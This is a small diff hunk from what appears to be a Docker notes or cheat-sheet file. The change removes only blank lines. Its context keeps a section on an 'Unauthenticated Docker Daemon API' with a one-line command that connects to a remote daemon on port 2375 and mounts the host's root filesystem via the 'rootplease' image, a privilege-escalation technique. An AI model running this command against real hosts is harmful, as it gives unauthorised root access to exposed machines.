@@ -15,12 +15,6 @@ Unauthenticated Docker Daemon API
 		docker -H tcp://<IP_address>:2375 run -v /:/hostOS -it --rm chrisfosterelli/rootplease
 
 
-
-
-
-
-
-
 Working with external data 
 	Mount a volume path (-v <host_dir>:<container_dir>)
 	mkdir ~/volume_location
